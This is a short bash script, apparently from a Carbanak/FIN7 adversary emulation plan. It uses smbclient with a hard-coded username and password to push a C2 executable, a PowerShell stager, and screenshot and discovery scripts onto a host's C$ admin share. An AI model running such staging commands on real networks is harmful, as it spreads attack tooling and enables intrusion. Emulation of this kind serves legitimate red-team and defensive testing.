#!/bin/bash
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/utilities/fin7_c2server/c2fin7.exe c2fin7.exe"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step12/GetSID.js GetSID.js"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step12/stager.ps1 stager.ps1"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step13/listRunningProcesses.js listRunningProcesses.js"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step13/netShareDiscovery.js netShareDiscovery.js"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step13/systemInformationDiscovery.js systemInformationDiscovery.js"
smbclient -U 'gfawkes'%'79a&LbjM@MlW8XZa' //192.168.0.6/C$ -b 8192 -c "put carbanak_fin7/emulation_procedures/fin7/step13/takeScreenshot.ps1 takeScreenshot.ps1"